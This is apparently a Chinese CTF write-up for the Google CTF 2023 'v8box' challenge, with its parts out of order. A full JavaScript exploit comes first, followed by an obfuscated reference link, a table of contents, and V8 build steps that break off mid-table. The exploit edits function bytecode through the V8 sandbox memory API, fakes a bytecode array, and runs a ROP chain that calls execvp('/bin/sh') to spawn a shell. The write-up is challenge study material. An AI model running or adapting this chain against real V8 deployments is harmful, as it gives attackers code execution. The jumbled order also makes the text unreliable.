
```javascript
function stop(){
%SystemBreak();
}
function p(arg){
%DebugPrint(arg);
}
function spin(){
while(1){};
}
function hex(str){
return str.toString(16).padStart(16,0);
}
function logg(str,val){
console.log("[+] "+ str + ": " + "0x" + hex(val));
}
function h(a,b){
return a+b+1;
}
tag = 1;
var offset = 0x20
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function addressOf(obj){
return Sandbox.getAddressOf(obj) | tag;
}
function getField(obj, offset) {
return memory.getUint32((obj + offset)& (~tag), true);
}
function setField32(obj, offset, val){
// logg("setField32 addr",obj+(offset));
memory.setUint32(Number((obj + offset) & (~tag)), Number(val), true);
}
function setField64(obj, offset, val){
let val\_lo = val & 0xffffffffn;
let val\_hi = (val & 0xffffffff00000000n) >> 32n;
// logg("setField64 addr",obj+(offset));
// logg("val",val);
// logg("val\_lo",val\_lo);
// logg("val\_hi",val\_hi);
setField32(obj,offset,val\_lo);
setField32(obj,offset+0x4,val\_hi);
}
function getu64(hi, lo) {
hi = BigInt(hi);
lo = BigInt(lo);
return (hi << 32n) + lo;
}
function EditBytecodeArray(val){
// logg("edid addr",BigInt(bytecode\_addr + offset) + sandbox\_base);
memory.setUint8((bytecode\_addr + offset),val);
++offset;
}
function ResetOffset(){
offset = 0x20;
}
function CopyByteCode(){
for (let i = 0; i < bc\_struct.length; ++i){
memory.setUint8(Number(FakeBytecodeArrayAddr+BigInt(i)),bc\_struct[i]);
}
}
h();
var sandbox\_base\_hi = getField(0,0x4001c);
var sandbox\_base\_lo = getField(0,0x40020) - 0x80000;
var sandbox\_base = getu64(sandbox\_base\_hi,sandbox\_base\_lo);
var d8\_hi = getField(0,0x40014);
var shared\_info = getField(addressOf(h),0xc);
var bytecode\_addr = getField(shared\_info,0x4) & (~tag);
logg("sandbox\_base addr",sandbox\_base);
logg("shared\_info addr",BigInt(shared\_info) + sandbox\_base);
logg("bytecode\_addr",BigInt(bytecode\_addr) + sandbox\_base);
// inst -> Ldr/Star + offset
// 0xb -> Ldr
// 0x18 -> Star
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0xaa);
var d8\_lo = h() \* 2;
d8\_lo = Number(d8\_lo) >>> 0;
var d8\_base = getu64(d8\_hi,d8\_lo) - 0xe5481cn;
// logg("d8\_lo",d8\_lo);
// logg("d8\_hi",d8\_hi);
logg("d8\_base",d8\_base);
/\*
0x00000000007ab7e3 : pop rdi ; ret
0x00000000007f01da : pop rsi ; ret
0x0000000000755f1b : pop rdx ; ret
0x0000000000679058 : ret
0x11bb840 ---> d8 execvp@plt
\*/
var execvp\_plt = 0x11bb840n + d8\_base;
var pop\_rdi\_ret = 0x00000000007ab7e3n + d8\_base;
var pop\_rsi\_ret = 0x00000000007f01dan + d8\_base;
var pop\_rdx\_ret = 0x0000000000755f1bn + d8\_base;
var ret = 0x0000000000679058n + d8\_base;
logg("execvp\_plt",execvp\_plt);
logg("pop\_rdi\_ret",pop\_rdi\_ret);
logg("pop\_rsi\_ret",pop\_rsi\_ret);
logg("pop\_rdx\_ret",pop\_rdx\_ret);
logg("ret",ret);
var FakeStack = new Array(0x1000).fill(0);
var FakeStackObjectAddr = addressOf(FakeStack);
var FakeStackAddr = getField(FakeStackObjectAddr,0x8) & (~tag);
var RopAddr = BigInt(FakeStackAddr)+sandbox\_base+0x30n;
logg("FakeStackObjectAddr",FakeStackObjectAddr);
logg("FakeStackAddr",FakeStackAddr);
logg("RopAddr",RopAddr);
let binsh = 0x68732f6e69622fn;
var binsh\_addr = BigInt(FakeStackAddr) + 0xa0n + sandbox\_base;
var FakeBytecodeArray = new Array(0x1000);
var FakeBytecodeArrayAddr = BigInt(addressOf(FakeBytecodeArray) & (~tag)) + 0x20n;
logg("FakeBytecodeArrayAddr",FakeBytecodeArrayAddr);
var bc\_struct = [
0x79, 0x09, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00,
0x19, 0x02, 0x00, 0x00, 0x61, 0x0f, 0x00, 0x00,
0x51, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0b, 0x03, 0x18, 0x00, 0xaa, 0x44, 0x01, 0x01,
0xaa, 0x00, 0x00, 0x00, 0x29, 0x09, 0x00, 0x00,
0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x10, 0x02, 0x00, 0x00, 0x99, 0x02, 0x00, 0x00,
0x84, 0xe3, 0x82, 0x00, 0x04, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xb5, 0x42, 0x19, 0x00,
0xfe, 0xff, 0xff, 0xff, 0x51, 0x02, 0x00, 0x00,
0x1c, 0x04, 0x00, 0x00, 0xb4, 0x04, 0x00, 0x00,
0xc9, 0x45, 0x19, 0x00, 0x89, 0x00, 0x00, 0x00,
0x06, 0x00, 0x00, 0x00, 0x69, 0x42, 0x19, 0x00,
0x49, 0x7a, 0x02, 0x00, 0x59, 0x42, 0x19, 0x00,
0x79, 0x09, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00
];
CopyByteCode();
setField64(FakeStackObjectAddr,-0x20,(FakeBytecodeArrayAddr+sandbox\_base+0x1n)<<8n);
setField32(FakeStackObjectAddr,-0x19,0n);
setField32(FakeStackObjectAddr,-0x28,0x4600n);
setField32(FakeStackObjectAddr,-0x24,0x0n);
// rop
setField64(FakeStackAddr,0xa0, binsh);
setField32(FakeStackObjectAddr,0x4,0x0n);
setField64(FakeStackObjectAddr,0x8,ret<<8n);
setField64(FakeStackObjectAddr,0x10,0x0n);
setField64(FakeStackAddr,0x38, (pop\_rdi\_ret));
setField64(FakeStackAddr,0x40, (binsh\_addr));
setField64(FakeStackAddr,0x48, (pop\_rsi\_ret));
setField64(FakeStackAddr,0x50, (0n));
setField64(FakeStackAddr,0x58, (pop\_rdx\_ret));
setField64(FakeStackAddr,0x60, (0n));
setField64(FakeStackAddr,0x68, (execvp\_plt));
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x3);
EditBytecodeArray(0x18);
EditBytecodeArray(0x0);
EditBytecodeArray(0xaa);
h(FakeStack);
```

![](upload/attach/202505/971428_7SSTD66UPNGGU9H.png)

# 参考链接

[<mark class="encrypted">a09K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3X3c8U0N6r3k6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4A6L8W2)9J5c8U0t1H3x3U0y4Q4x3V1k6I4N6h3q4D9M7#2)9J5c8Y4y4S2L8X3c8T1L8%4S2Q4x3X3c8$3z5r3u0G2P5q4)9J5c8Y4y4G2L8s2g2@1K9h3!0F1i4K6g2p5i4K6t1^5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3X3c8U0N6r3k6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4A6L8W2)9J5c8U0t1H3x3U0y4Q4x3V1k6I4N6h3q4D9M7#2)9J5c8Y4y4S2L8X3c8T1L8%4S2Q4x3X3c8$3z5r3u0G2P5q4)9J5c8Y4y4G2L8s2g2@1K9h3!0F1</mark> "<mark class="encrypted">2a4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3X3c8U0N6r3k6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4A6L8W2)9J5c8U0t1H3x3U0y4Q4x3V1k6I4N6h3q4D9M7#2)9J5c8Y4y4S2L8X3c8T1L8%4S2Q4x3X3c8$3z5r3u0G2P5q4)9J5c8Y4y4G2L8s2g2@1K9h3!0F1</mark>")

# Google CTF 2023 - v8box

目录

- [Google CTF 2023 - v8box](https://bbs.kanxue.com/#google-ctf-2023---v8box)
- [环境搭建](https://bbs.kanxue.com/#环境搭建)
- [漏洞分析](https://bbs.kanxue.com/#漏洞分析)
- [patch分析](https://bbs.kanxue.com/#patch分析)
- [漏洞分析](https://bbs.kanxue.com/#漏洞分析-1)
- [利用思路](https://bbs.kanxue.com/#利用思路)
- [exp](https://bbs.kanxue.com/#exp)
- [参考链接](https://bbs.kanxue.com/#参考链接)

# 环境搭建

查看下`build.dockerfile`，本地编译一个环境

![](https://bbs.kanxue.com/upload/attach/202505/971428_6XHK2S5665NQ994.png)

|  |  |
| --- | --- |
| `1  2  3  4  5  6  7  8` | `fetch v8`  `git switch -d d90d4533b05301e2be813a5f90223f4c6c1bf63d`  `gclient sync`  `git apply < ./v8.patch`  `git apply < ./0001-Protect-chunk-headers-on-the-heap.patch`  `./tools/dev/v8gen.py x64.release`    `vim ./out.gn/x64.release/args.gn` |

根据附件所给的编译选项，修改`args.gn`的内容

|  |  |
| --- | --- |
